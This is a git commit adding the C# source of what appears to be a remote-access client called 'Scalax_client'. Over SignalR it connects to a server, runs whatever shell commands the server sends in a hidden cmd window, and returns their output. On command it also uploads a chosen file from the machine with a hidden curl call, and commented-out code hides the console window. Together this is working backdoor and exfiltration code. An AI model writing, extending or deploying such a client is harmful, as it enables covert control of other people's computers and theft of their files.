eb6e25f215296112c0970f548ecfc56aa27edac5
vanDev0 <basal777777777@gmail.com>
2022-12-09 01:56:53 +0300

    Add project files.

---
+++ CoreTasks.cs
@@ -0,0 +1,63 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+using Scalax_client.CONSTANTS;
+
+
+namespace Scalax_client.CoreTasks
+{
+    public class CoreTasks
+    {
+
+        public static async Task<Task> CheckForCmdOuputThenFireEventToServer(Process proc, string fPath, ushort? maxTriesVal, TimeSpan? intvlTime, CancellationTokenSource CLTknSrc, CancellationToken CLTkn, Func<Task> FireEvent)
+        {
+            bool CheckIfFileIsSent_AsyncInterval__IsValid = true;
+            ushort CheckIfFileIsSent_TimesIndicator = 0;
+            TimeSpan? intervalTimeSpan = intvlTime is null ? TimeSpan.FromSeconds(1) : intvlTime;
+
+
+            Task.Run(async () =>
+            {
+                if (CheckIfFileIsSent_AsyncInterval__IsValid)
+                    while (CheckIfFileIsSent_TimesIndicator < (maxTriesVal ?? byte.MaxValue))
+                    {
+                        await Task.Delay((TimeSpan)intervalTimeSpan);
+                        CheckIfFileIsSent_TimesIndicator++;
+
+                        if (File.Exists(fPath))
+                        {
+                            await FireEvent();
+
+                            File.Delete(fPath);
+
+                            proc?.Dispose();
+                            proc?.Close();
+                            proc?.Kill();
+
+                            CheckIfFileIsSent_AsyncInterval__IsValid = false;
+                            if (CLTknSrc is not null) CLTknSrc.Cancel();
+                            break;
+                        }
+
+                    }
+                else
+                {
+                    if (CLTknSrc is not null) CLTknSrc.Cancel();
+                }
+
+            }, CLTkn).Start();
+
+
+            return Task.CompletedTask;
+
+        }
+
+
+
+
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,165 @@
+﻿using Microsoft.AspNetCore.SignalR.Client;
+using System.Diagnostics;
+
+using Scalax_client.CONSTANTS;
+using Scalax_client.CoreTasks;
+
+
+
+// Code to hide app...
+////
+//[System.Runtime.InteropServices.DllImport("kernel32.dll")]
+//static extern IntPtr GetConsoleWindow();
+
+//[System.Runtime.InteropServices.DllImport("user32.dll")]
+//static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+//IntPtr handleConsoleWindow = GetConsoleWindow();
+
+//ShowWindow(handleConsoleWindow, 0); // 0 is the index that indcates the window showness...
+
+////
+
+
+
+HubConnection CHC = new HubConnectionBuilder()
+    .WithUrl($"{CONSTANTS.SERVER_ENDPOINT_URL}/Hubs/communicate")
+    .WithAutomaticReconnect()
+    .Build()
+    ;
+
+CHC.StartAsync().Wait();
+
+
+async Task RecordConnection()
+{
+    if (CHC is null) return;
+    else Console.WriteLine("Client Connected...");
+
+    await CHC.SendAsync("Init", Environment.UserName, CHC.ConnectionId, false);
+}
+
+RecordConnection().Wait();
+
+
+
+
+//var p = new Process();
+//p.InitializeLifetimeService();
+
+
+
+CHC.On("ExecCmdOnOne", (string cmd) =>
+{
+
+    //using var sw =  File.CreateText(CONSTANTS.tmpFilePath);
+    //sw.WriteAsync('*').Wait();
+    //File.CreateText(CONSTANTS.tmpFilePath);
+
+
+
+
+    //Task.Run(() =>
+    //{
+    //    p.Start();
+
+    //}).ContinueWith(async @T =>
+    //{
+    //    await CHC.SendAsync("SendExecCmdOnOneRes", CHC.ConnectionId, p.StandardOutput);
+
+    //}).Wait();
+
+    var cmdProc = new Process
+    {
+        StartInfo = new ProcessStartInfo
+        {
+            FileName = "cmd",
+            WorkingDirectory = @"C:\",
+            //Arguments = $"/C {cmd} > \"{CONSTANTS.tmpFilePath.Replace("//", "\\")}\" & cls",
+            Arguments = $@"/C {cmd} > ""{CONSTANTS.tmpFilePath}"" & cls",
+            WindowStyle = ProcessWindowStyle.Hidden,
+            UseShellExecute = true,
+            //Verb = "runas", // Related to admin prevlliges things...
+        }
+    };
+    cmdProc.Start();
+
+
+    var CLTknSrc = new CancellationTokenSource();
+    CancellationToken CLTkn = CLTknSrc.Token;
+
+    CoreTasks.CheckForCmdOuputThenFireEventToServer(
+        cmdProc,
+        CONSTANTS.tmpFilePath,
+        null,
+        null,
+        CLTknSrc,
+        CLTkn,
+        (async () =>
+        {
+            await CHC.SendAsync("SendExecCmdOnOneRes", CHC.ConnectionId, File.ReadAllText(CONSTANTS.tmpFilePath));
+        })
+    ).Wait();
+
+});
+
+
+CHC.On("PullTheFile", (string fileData) =>
+{
+
+    string? fileType = fileData.Split('-')?[0];
+    string? filePath = fileData.Split('-')?[1];
+    string? fileTkn = fileData.Split('-')?[2];
+    string? fileName = filePath?.Split(@"\")?.LastOrDefault()?.Split('.')?.FirstOrDefault();
+
+
+    //////// !!OBSELETE!!
+    //Console.WriteLine($"Encoding ${fileType}... at {filePath}");
+    //byte[]? bytesArr = File.ReadAllBytes(filePath);
+    //string fileAsStr = fileType.Equals("img") ? Convert.ToBase64String(bytesArr) : File.ReadAllText(filePath);
+    //Console.WriteLine($"Encoded to {fileAsStr} \n\n or as byte[] : \n\n {bytesArr} [{bytesArr.Length}]");
+    //CHC.SendAsync("SendPulledFileAsStr", bytesArr).Wait();
+    //Console.WriteLine("DONE!..");
+    ////////
+
+
+    Console.WriteLine($"Uploading the file at ({filePath})...");
+
+    var cmdProc = new Process
+    {
+        StartInfo = new ProcessStartInfo
+        {
+            FileName = "cmd",
+            WorkingDirectory = @"C:\",
+            Arguments = $@"/C curl -e 'https://hex.scalax.co.xyz/beta-{fileTkn}-0/{fileName}' {CONSTANTS.SERVER_ENDPOINT_URL}/fu -F file=@{filePath} & echo done > ""{Path.Combine(CONSTANTS.exeFilePath, "sentF.txt")}"" & cls",
+            WindowStyle = ProcessWindowStyle.Hidden,
+        }
+    };
+    cmdProc.Start();
+
+
+    var CLTknSrc = new CancellationTokenSource();
+    CancellationToken CLTkn = CLTknSrc.Token;
+
+    CoreTasks.CheckForCmdOuputThenFireEventToServer (
+        cmdProc,
+        Path.Combine(CONSTANTS.exeFilePath, "sentF.txt"),
+        byte.MaxValue * 25,
+        TimeSpan.FromSeconds(1),
+        CLTknSrc,
+        CLTkn,
+        (async () =>
+        {
+            await CHC.SendAsync("SendPulledFileAsDownloadUri", filePath);
+        })
+    ).Wait();
+
+
+
+});
+
+
+
+////
+Thread.Sleep(-1);
+////
